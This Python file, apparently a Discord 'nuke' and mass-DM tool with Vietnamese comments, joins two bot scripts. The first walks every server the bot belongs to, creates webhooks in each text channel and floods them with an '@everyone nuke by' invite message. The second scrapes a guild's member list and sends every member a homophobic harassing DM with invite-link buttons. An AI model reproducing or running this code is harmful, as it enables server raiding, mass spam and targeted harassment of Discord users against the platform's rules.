import requests
import json
import os
import threading
from time import time

TOKEN = "<TOKEN>"
CACHE_FILE = "cache.json"
CACHE_TTL = 36000  # 1 giờ

API = "https://discord.com/api/v10"
HEADERS = {
    "Authorization": f"Bot {TOKEN}",
    "Content-Type": "application/json"
}

# ---------- CACHE THỦ CÔNG ----------
if os.path.exists(CACHE_FILE):
    with open(CACHE_FILE, "r", encoding="utf-8") as f:
        cache = json.load(f)
else:
    cache = {"guilds": {}, "channels": {}, "webhooks": {}}


def save_cache():
    with open(CACHE_FILE, "w", encoding="utf-8") as f:
        json.dump(cache, f, indent=2, ensure_ascii=False)


def is_cache_valid(entry):
    return entry and (time() - entry["time"] < CACHE_TTL)
# ------------------------------------


def get_guilds():
    """Lấy danh sách server có cache thủ công"""
    if is_cache_valid(cache["guilds"].get("data")):
        print("📦 Cache guilds")
        return cache["guilds"]["data"]["value"]

    r = requests.get(f"{API}/users/@me/guilds", headers=HEADERS)
    r.raise_for_status()
    guilds = r.json()
    cache["guilds"]["data"] = {"value": guilds, "time": time()}
    save_cache()
    return guilds


def get_guild_channels(guild_id):
    """Lấy text channel trong 1 server có cache"""
    if is_cache_valid(cache["channels"].get(guild_id)):
        print(f"📦 Cache channels {guild_id}")
        return cache["channels"][guild_id]["value"]

    r = requests.get(f"{API}/guilds/{guild_id}/channels", headers=HEADERS)
    r.raise_for_status()
    channels = [c for c in r.json() if c["type"] == 0]
    cache["channels"][guild_id] = {"value": channels, "time": time()}
    save_cache()
    return channels


def get_channel_webhooks(channel_id):
    """Lấy webhook trong channel có cache"""
    if is_cache_valid(cache["webhooks"].get(channel_id)):
        print(f"📦 Cache webhooks {channel_id}")
        return cache["webhooks"][channel_id]["value"]

    r = requests.get(f"{API}/channels/{channel_id}/webhooks", headers=HEADERS)
    r.raise_for_status()
    hooks = r.json()
    cache["webhooks"][channel_id] = {"value": hooks, "time": time()}
    save_cache()
    return hooks


def create_webhook(channel_id, name="AutoHook"):
    """Tạo webhook mới và xóa cache channel"""
    r = requests.post(f"{API}/channels/{channel_id}/webhooks", headers=HEADERS, json={"name": "hai1723 on top"})
    r.raise_for_status()
    hook = r.json()

    # Xóa cache channel
    if channel_id in cache["webhooks"]:
        del cache["webhooks"][channel_id]
        save_cache()
        print(f"🧹 Đã xóa cache webhooks {channel_id}")

    return hook


def send_message_via_webhook(url, content="hello"):
    """Gửi message qua webhook"""
    content = """
@everyone 
nuke by https://discord.gg/E6rW9SpSW6 :yum: 
"""
    r = requests.post(url, json={"content": content})
    print(f"📨 [{r.status_code}] -> {url}")


def spammer():
    guilds = get_guilds()
    print(f"➡️ Bot đang ở {len(guilds)} server\n")

    for g in guilds:
        gid = g["id"]
        gname = g["name"]
        print(f"🏰 Server: {gname} ({gid})")

        channels = get_guild_channels(gid)
        print(f"   📂 Có {len(channels)} kênh văn bản")

        for c in channels:
            cid = c["id"]
            cname = c["name"]
            try:
                hooks = get_channel_webhooks(cid)
                if not hooks:
                    print(f"   🧩 Không có webhook, đang tạo mới...")
                    create_webhook(cid)
                    hooks = get_channel_webhooks(cid)
                print(f"   ✅ {len(hooks)} webhook trong #{cname}")

                for hook in hooks:
                    send_message_via_webhook(hook["url"], "hello")

            except requests.HTTPError as e:
                print(f"   ⚠️ Lỗi khi xử lý #{cname}: {e}")

        print("─────────────────────────────")


spammer()

import sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

import requests
import threading
import time
TOKEN = "<TOKEN>"
GUILD_ID = "<GUILDID>"

HEADERS = {
    "Authorization": f"Bot {TOKEN}",
    "Content-Type": "application/json"
}

members_list = []
threads = []

CHANNEL_URL = "https://discord.gg/E6rW9SpSW6"

def send_dm(user_id):
    # Tạo DM channel
    url = "https://discord.com/api/v10/users/@me/channels"
    payload = {"recipient_id": user_id}
    res = requests.post(url, headers=HEADERS, json=payload)
    if res.status_code != 200:
        print(f"[!] Không tạo được DM với {user_id}: {res.text}")
        return
    
    dm_channel = res.json()["id"]

    # Message có 2 button
    message_data = {
        "content": "bạn bị gay ko? https://discord.gg/E6rW9SpSW6",
        "components": [
            {
                "type": 1,  # ActionRow
                "components": [
                    {
                        "type": 2,
                        "style": 5,  # Link button
                        "label": "Có, Tôi bị gay",
                        "url": CHANNEL_URL
                    },
                    {
                        "type": 2,
                        "style": 5,  # Link button
                        "label": "Tôi không gay",
                        "url": CHANNEL_URL
                    }
                ]
            }
        ]
    }

    r2 = requests.post(f"https://discord.com/api/v10/channels/{dm_channel}/messages", headers=HEADERS, json=message_data)
    if r2.status_code == 200:
        print(f"[+] Đã gửi DM cho {user_id}")
    else:
        print(f"[!] Lỗi gửi DM {user_id}: {r2.text}")

def scan_batch(batch):
    for member in batch:
        user = member.get("user", {})
        if not user or user.get("bot"):  # bỏ qua bot
            continue
        user_id = user.get("id")
        if user_id:
            members_list.append(user_id)

def massdm():
    url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members?limit=1000"
    after = None

    print("[*] Bắt đầu quét...")

    while True:
        full_url = url + (f"&after={after}" if after else "")
        res = requests.get(full_url, headers=HEADERS)

        if res.status_code != 200:
            print(f"[!] Lỗi API: {res.status_code} - {res.text}")
            break

        members = res.json()
        if not members:
            break

        thread = threading.Thread(target=scan_batch, args=(members,))
        thread.start()
        threads.append(thread)

        after = members[-1]["user"]["id"]

    for thread in threads:
        thread.join()

    print(f"[*] Tổng cộng {len(members_list)} member. Bắt đầu gửi DM...")

    dm_threads = []
    if True == True:
        for uid in members_list:
            t = threading.Thread(target=send_dm, args=(uid,))
            t.start()
            dm_threads.append(t)
            time.sleep(0.3)  # tránh tạo quá nhiều thread cùng lúc

        for t in dm_threads:
            t.join()
members_list = []
massdm()

